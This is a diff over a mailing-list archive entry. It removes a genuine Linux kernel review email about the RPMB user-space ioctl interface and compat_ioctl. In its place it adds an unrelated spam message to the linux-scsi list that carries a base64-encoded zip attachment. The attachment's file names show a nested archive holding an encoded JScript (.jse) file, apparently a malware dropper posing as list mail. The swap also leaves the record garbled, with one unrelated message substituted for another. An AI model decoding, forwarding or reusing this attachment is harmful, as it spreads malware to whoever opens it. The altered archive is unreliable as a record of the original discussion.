@@ -1,119 +1,90 @@
-From: "Winkler, Tomas" <tomas.winkler@intel.com>
-Subject: RE: [PATCH v5 4/8] char: rpmb: provide a user space interface
-Date: Sun, 4 Sep 2016 20:56:45 +0000
-Message-ID: <5B8DA87D05A7694D9FA63FD143655C1B542C6E28@hasmsx108.ger.corp.intel.com>
-References: <1468873673-21776-1-git-send-email-tomas.winkler@intel.com>
- <1468873673-21776-5-git-send-email-tomas.winkler@intel.com>
- <20160805200823.GB7999@amd>
- <5B8DA87D05A7694D9FA63FD143655C1B542B8AC9@hasmsx108.ger.corp.intel.com>
- <20160831104955.GA10180@kroah.com>
- <5B8DA87D05A7694D9FA63FD143655C1B542C5B6F@hasmsx108.ger.corp.intel.com>
- <20160901204633.GB5960@kroah.com>
- <5B8DA87D05A7694D9FA63FD143655C1B542C6CC0@hasmsx108.ger.corp.intel.com>
- <20160904202029.GB31115@amd>
+From: <junplzen@cmkos.cz>
+Subject: linux-scsin
+Date: Mon, 05 Sep 2016 10:35:59 0000
+Message-ID: <000101d20761$4ac27a50$c0a80001@static-106-203-78-212.thenetworkfactory.nl>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 8BIT
-Return-path: <linux-mmc-owner@vger.kernel.org>
-In-Reply-To: <20160904202029.GB31115@amd>
-Content-Language: en-US
-Sender: linux-mmc-owner@vger.kernel.org
-To: Pavel Machek <pavel@ucw.cz>
-Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>, Ulf Hansson <ulf.hansson@linaro.org>, "Hunter, Adrian" <adrian.hunter@intel.com>, James Bottomley <James.Bottomley@HansenPartnership.com>, "Martin K. Petersen" <martin.petersen@oracle.com>, Vinayak Holikatti <vinholikatti@gmail.com>, Andy Lutomirski <luto@kernel.org>, Arve Hj?nnev?g <arve@android.com>, Michael Ryleev <gmar@google.com>, Joao Pinto <Joao.Pinto@synopsys.com>, Christoph Hellwig <hch@lst.de>, Yaniv Gardi <ygardi@codeaurora.org>, "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>, "linux-mmc@vger.kernel.org" <linux-mmc@vger.kernel.org>, "linux-scsi@vger.kernel.org" <linux-scsi@vger.kernel.org>
+Content-Type: application/zip; name="ryqlinux-scsia.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-scsi-owner@vger.kernel.org>
+Received: from static-106-203-78-212.thenetworkfactory.nl ([212.78.203.106]:47626
+        "HELO static-106-203-78-212.thenetworkfactory.nl"
+        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with SMTP
+        id S1750908AbcIEEgD (ORCPT <rfc822;linux-scsi@vger.kernel.org>);
+        Mon, 5 Sep 2016 00:36:03 -0400
+Content-Disposition: attachment
+Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
+To: linux-scsi@vger.kernel.org
 
-
-\
-> Subject: Re: [PATCH v5 4/8] char: rpmb: provide a user space interface
-> 
-> On Sun 2016-09-04 11:35:33, Winkler, Tomas wrote:
-> >
-> > > On Thu, Sep 01, 2016 at 08:05:26PM +0000, Winkler, Tomas wrote:
-> > > >
-> > > > >
-> > > > > On Sun, Aug 07, 2016 at 09:44:03AM +0000, Winkler, Tomas wrote:
-> > > > > > >
-> > > > > > > On Mon 2016-07-18 23:27:49, Tomas Winkler wrote:
-> > > > > > > > The user space API is achieved via two synchronous IOCTL.
-> > > > > > >
-> > > > > > > IOCTLs?
-> > > > > >
-> > > > > > Will fix
-> > > > > >
-> > > > > > > > Simplified one, RPMB_IOC_REQ_CMD, were read result cycles
-> > > > > > > > is
-> > > > > > > performed
-> > > > > > > > by the framework on behalf the user and second,
-> > > > > > > > RPMB_IOC_SEQ_CMD
-> > > > > > > where
-> > > > > > > > the whole RPMB sequence including RESULT_READ is supplied
-> > > > > > > > by the
-> > > > > caller.
-> > > > > > > > The latter is intended for  easier adjusting  of the
-> > > > > > > > applications that use MMC_IOC_MULTI_CMD ioctl.
-> > > > > > >
-> > > > > > > Why "  "?
-> > > > > > Not sure I there is enough clue in your question.
-> > > > > > >
-> > > > > > > >
-> > > > > > > > Signed-off-by: Tomas Winkler <tomas.winkler@intel.com>
-> > > > > > >
-> > > > > > > > +
-> > > > > > > > +static long rpmb_ioctl(struct file *fp, unsigned int cmd,
-> > > > > > > > +unsigned long arg) {
-> > > > > > > > +	return __rpmb_ioctl(fp, cmd, (void __user *)arg); }
-> > > > > > > > +
-> > > > > > > > +#ifdef CONFIG_COMPAT
-> > > > > > > > +static long rpmb_compat_ioctl(struct file *fp, unsigned int cmd,
-> > > > > > > > +			      unsigned long arg) {
-> > > > > > > > +	return	__rpmb_ioctl(fp, cmd, compat_ptr(arg));
-> > > > > > > > +}
-> > > > > > > > +#endif /* CONFIG_COMPAT */
-> > > > > > >
-> > > > > > > Description of the ioctl is missing,
-> > > > > > Will add.
-> > > > > >
-> > > > > > and it should certainly be designed in a way
-> > > > > > > that it does not need compat support.
-> > > > > >
-> > > > > > The compat_ioctl handler just casts the compat_ptr, I believe
-> > > > > > this should be done unless the ioctl is globaly registered in
-> > > > > > fs/compat_ioctl.c, but I might be wrong.
-> > > > >
-> > > > > You shouldn't need a compat ioctl for anything new that is
-> > > > > added, unless your api is really messed up.  Please test to be
-> > > > > sure, and not use a compat ioctl at all, it isn't that hard to do.
-> > > >
-> > > > compat_ioctl is called anyhow when CONFIG_COMPAT is set, there is
-> > > > no way around it, or I'm missing something?  Actually there is no
-> > > > more than that for the COMPAT support in this code.
-> > >
-> > > If you don't provide a compat_ioctl() all should be fine, right?
-> >
-> > No,  this doesn't work the driver has to provide compat_ioctl
-> >
-> > You would expect something like
-> > if (!f.file->f_op->compat_ioctl) {
-> >                         error =
-> > f_op->f.file->f_op->unlocked_ioctl((f.file, cmd, compat_ptr(arg)) }
-> > But there is no such code under  fs/compat_ioctl.c
-> >
-> > The translation has to implemented by the device driver or registered
-> > directly in fs/compat_ioct.c in do_ioctl_trans or ioctl_pointer[]
-> >
-> > If compat_ioct is not provided the application is receiving
-> > : ioctl failure -1: Inappropriate ioctl for device
-> 
-> Care to submit a patch? We should not really have to include compat_ioctl
-> support if it is already compatible...
-> 
-> Or maybe better provide empty function drivers can fill in when
-> compatible...?
-> 
-I'm not sure it is so simple to generallize, because ioctl selection logic in compat_ioctl has already a default actions and second because 'arg' my not be a pointer. 
-Maybe a beter option would be to provide a function in spirit generic_ fs functions let say compat_generic_ioct() that would just cal unlocked_ioctl(fp, cmd, compat_ptr(arg))
-
-Thanks
-Tomas
-
-
+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
